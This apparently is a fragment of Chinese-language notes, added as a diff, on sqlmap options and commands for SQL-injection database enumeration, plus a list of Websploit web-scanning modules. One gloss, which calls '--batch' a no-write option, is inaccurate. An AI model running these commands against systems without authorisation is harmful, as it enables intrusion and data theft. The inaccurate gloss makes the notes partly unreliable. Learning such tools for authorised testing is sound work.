+--level & -v :5个等级，默认2
+--batch //不对目标写入
+--time-sec //设定延时注入时间，默认5秒
+sqlmap -u "url" --time-sec 6
+sqlmap -u "url" --time-sec 6 --dbs
+sqlmap -u "url" --batch --tamper “脚本名称”-v 3 --dbs
+sqlmap -u "url" --dbs
+
+Websploit web modules
+show modules //列出所有模块
+use 模块名 //进入模块
+show options //查看所有参数
+set 参数名  //设置参数
+run         //执行
+1.web modules </web模块/>        
+web/apache_users  //扫描目录的Apache用户       
+web/dir_scanner     // web目录扫描                    
+web/pma             //PHPMyAdmin登录页面扫描        
+web/cloudflare_resolver  // CloudFlare解析器        
+  web/wmap             //web信息收集
+
+Metasploit Target for Android
